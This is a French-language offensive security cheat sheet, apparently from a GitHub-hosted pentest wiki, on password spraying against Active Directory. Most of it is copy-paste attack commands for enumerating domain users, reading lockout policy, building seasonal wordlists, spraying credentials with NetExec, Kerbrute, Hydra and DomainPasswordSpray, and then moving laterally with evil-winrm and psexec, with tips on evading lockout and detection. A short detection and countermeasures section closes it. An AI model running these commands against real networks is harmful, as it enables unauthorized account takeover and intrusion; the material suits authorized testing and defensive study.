# Password Spraying 

Le Password Spraying est une technique d'attaque par force brute inversée. Au lieu de tester de nombreux mots de passe sur un seul compte, on teste **un seul mot de passe sur de nombreux comptes**. Cette approche permet de contourner les politiques de verrouillage de comptes (account lockout) tout en restant discret.

---

## Mécanisme

Les politiques de verrouillage bloquent un compte après X tentatives échouées consécutives. Le Password Spraying contourne cette protection en espaçant les tentatives dans le temps et en ne testant qu'un mot de passe par compte par cycle.
```
[Attaquant] → Password123 → user1  (échec)
[Attaquant] → Password123 → user2  (échec)
[Attaquant] → Password123 → user3  (succès)
[Attaquant] → Password123 → user4  (échec)
             attendre X minutes
[Attaquant] → Summer2024! → user1  (échec)
[Attaquant] → Summer2024! → user3  (échec — déjà compromis)
...
```

### Conditions d'exploitation

- Posséder une liste d'utilisateurs valides du domaine
- Connaître la politique de verrouillage (seuil + durée)
- Accès réseau aux services d'authentification (SMB, LDAP, WinRM, etc.)
- Avoir une liste de mots de passe candidats (saison+année, nom entreprise, etc.)



## Prérequis

| Élément            | Détail                                              |
|--------------------|-----------------------------------------------------|
| Accès requis       | Aucun compte requis                                 |
| Données nécessaires| Liste d'utilisateurs valides du domaine             |
| Position réseau    | Accès aux ports 445 / 389 / 5985 de la cible        |
| Outils nécessaires | NetExec / Kerbrute / Spray / Hydra                  |



## Quick Attack

::: code-group
```bash [NetExec SMB]
nxc smb <DC> -u users.txt -p Password123! --continue-on-success
```
```bash [NetExec LDAP]
nxc ldap <DC> -u users.txt -p Password123! --continue-on-success
```
```bash [Kerbrute]
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123!
```
```bash [Spray]
spray.py -smb <DC> -u users.txt -p Password123! -c
```

:::



## Workflow
```
1. Enumérer les utilisateurs du domaine
2. Identifier la politique de verrouillage
3. Constituer la liste de mots de passe candidats
4. Lancer le spray (1 password à la fois)
5. Attendre entre chaque cycle (respecter le seuil)
6. Valider les credentials trouvés
7. Mouvement latéral
```



## Enumération des Utilisateurs

### Via RPC (null session)
```bash
rpcclient -U "" -N <DC> -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x
```

### Via Kerberos (sans compte)
```bash
kerbrute userenum -d domain.com --dc <DC> /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```

### Via LDAP (avec compte)
```bash
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName
```

### Via NetExec
```bash
nxc smb <DC> -u user -p password --users
nxc ldap <DC> -u user -p password --users
```

### Via enum4linux
```bash
enum4linux -U <DC>
```



## Politique de Verrouillage

### Identifier le seuil avant de commencer
```bash
# Via NetExec
nxc smb <DC> -u user -p password --pass-pol

# Via enum4linux
enum4linux -P <DC>

# Via rpcclient
rpcclient -U "user%password" <DC> -c "getdompwinfo"

# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=domain)" lockoutThreshold lockoutDuration
```

### Interpréter les résultats

| Paramètre            | Description                                    |
|----------------------|------------------------------------------------|
| `lockoutThreshold`   | Nombre de tentatives avant verrouillage        |
| `lockoutDuration`    | Durée du verrouillage                          |
| `lockoutObservation` | Fenêtre de temps pour le compteur              |

> Règle d'or : ne jamais dépasser **`lockoutThreshold - 1`** tentatives par compte par fenêtre de temps.

---

## Constitution de la Wordlist

### Patterns classiques à tester
```
Saison + Année     : Spring2024!, Summer2024!, Winter2024!
Nom entreprise     : Company123!, Company2024
Mois + Année       : January2024!, Mars2024!
Patterns courants  : Password123!, Welcome1!, P@ssw0rd
Prénom             : Prenom123!, Prenom2024!
```

### Générer une wordlist ciblée
```bash
# Avec pydictor
pydictor -base d --len 8 8 -o passwords.txt

# Avec CeWL (depuis le site de l'entreprise)
cewl https://www.company.com -d 3 -m 6 -o company_words.txt

# Combiner avec des règles
hashcat --stdout company_words.txt -r /usr/share/hashcat/rules/best64.rule > passwords.txt
```



## Exploitation

###  NetExec SMB
```bash
# Un mot de passe
nxc smb <DC> -u users.txt -p Password123! --continue-on-success

# Liste de mots de passe (attention au lockout)
nxc smb <DC> -u users.txt -p passwords.txt --continue-on-success

# Admin local
nxc smb <target> -u users.txt -p Password123! --local-auth --continue-on-success
```

###  NetExec LDAP
```bash
nxc ldap <DC> -u users.txt -p Password123! --continue-on-success
```

###  NetExec WinRM
```bash
nxc winrm <target> -u users.txt -p Password123! --continue-on-success
```

###  Kerbrute
```bash
# Password spray via Kerberos (plus discret)
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123!

# Avec délai entre les tentatives
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123! --delay 1000
```

### Spray.py
```bash
# SMB
spray.py -smb <DC> -u users.txt -p Password123! -c

# LDAP
spray.py -ldap <DC> -u users.txt -p Password123! -c

# Avec délai
spray.py -smb <DC> -u users.txt -p Password123! -c --delay 30
```

### Hydra
```bash
# SMB
hydra -L users.txt -p Password123! smb://<target>

# RDP
hydra -L users.txt -p Password123! rdp://<target>

# WinRM
hydra -L users.txt -p Password123! winrm://<target>
```

###  DomainPasswordSpray (PowerShell)
```powershell
Import-Module .\DomainPasswordSpray.ps1

# Spray automatique (récupère les users du domaine)
Invoke-DomainPasswordSpray -Password Password123! -OutFile results.txt

# Avec liste personnalisée
Invoke-DomainPasswordSpray -UserList users.txt -Password Password123! -OutFile results.txt
```



## Post-Exploitation

### Valider les credentials trouvés
```bash
# SMB
nxc smb <DC> -u compromised_user -p Password123!

# Vérifier les droits
nxc smb 192.168.1.0/24 -u compromised_user -p Password123!
```

### Identifier le niveau d'accès
```bash
# Groupes du compte
nxc ldap <DC> -u compromised_user -p Password123! --groups

# Shares accessibles
nxc smb <target> -u compromised_user -p Password123! --shares

# Admin local sur quelles machines
nxc smb 192.168.1.0/24 -u compromised_user -p Password123!
```

### Mouvement latéral
```bash
# Shell distant
evil-winrm -i <target> -u compromised_user -p Password123!

# PSExec si admin
impacket-psexec domain.com/compromised_user:Password123!@<target>
```



## Detection & IOC

### Event IDs Windows à surveiller

| Event ID | Description                                           |
|----------|-------------------------------------------------------|
| 4625     | Logon échoué — nombreux échecs sur comptes différents |
| 4648     | Logon avec credentials explicites                     |
| 4768     | TGT Kerberos demandé (Kerbrute)                       |
| 4771     | Echec pré-auth Kerberos                               |
| 4776     | Validation credentials NTLM échouée                  |

### Indicateurs de compromission

- Nombreux Event 4625 depuis la même IP sur des comptes différents
- Authentifications échouées espacées régulièrement dans le temps
- Connexions Kerberos (4768/4771) depuis une IP inhabituelle sur de nombreux comptes
- Pattern régulier de tentatives (toutes les X minutes)



## Contre-mesures

- Définir et appliquer une **politique de verrouillage stricte**
- Activer **Azure AD Smart Lockout** ou équivalent
- Implémenter le **MFA** sur tous les comptes
- Monitorer les **Event IDs 4625 / 4771** avec alertes SIEM
- Utiliser des mots de passe longs et complexes (bannir les patterns saisonniers)
- Activer **Microsoft Entra ID Protection** pour détecter les sprays
- Mettre en place une **liste noire de mots de passe** (Password Protection)
- Former les utilisateurs contre les mots de passe prévisibles



## Points d'attaque

- Mots de passe saisonniers ou liés à l'entreprise
- Politique de verrouillage absente ou trop permissive
- Absence de MFA sur les comptes
- Comptes de service avec mots de passe simples
- Nouveaux comptes avec mot de passe par défaut
- Comptes anciens jamais renouvelés



::: tip

- Toujours identifier la politique de verrouillage **avant** de commencer
- Respecter la règle : **`lockoutThreshold - 1`** tentatives max par fenêtre
- Prioriser les patterns saisonniers : `Summer2024!`, `Autumn2024!`, `Company2024!`
- Kerbrute est plus discret que NetExec car il utilise Kerberos directement
- Espacer les cycles de spray d'au moins **30 à 60 minutes**
- Corréler avec l'énumération OSINT pour des passwords ciblés (LinkedIn, site web)
- `--continue-on-success` est indispensable avec NetExec pour ne pas s'arrêter au premier match

:::


::: details Checklist

- Politique de verrouillage identifiée
- Liste d'utilisateurs constituée
- Wordlist ciblée préparée
- Spray lancé (1 password par cycle)
- Délai entre cycles respecté
- Credentials valides trouvés
- Niveau d'accès des comptes compromis vérifié
- Mouvement latéral effectué
- IOC documentés

:::


## Tools

- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Spray](https://github.com/Greenwolf/Spray)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [CeWL](https://github.com/digininja/CeWL)
- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)



## Ressources

- [HackTricks Password Spraying](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)
- [The Hacker Recipes Password Spraying](https://www.thehacker.recipes/ad/movement/credentials/bruteforcing/password-spraying)
- [PayloadsAllTheThings Password Spraying](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-spraying)
- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [DomainPasswordSpray GitHub](https://github.com/dafthack/DomainPasswordSpray)






<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/password-spraying.md)</span>

</div>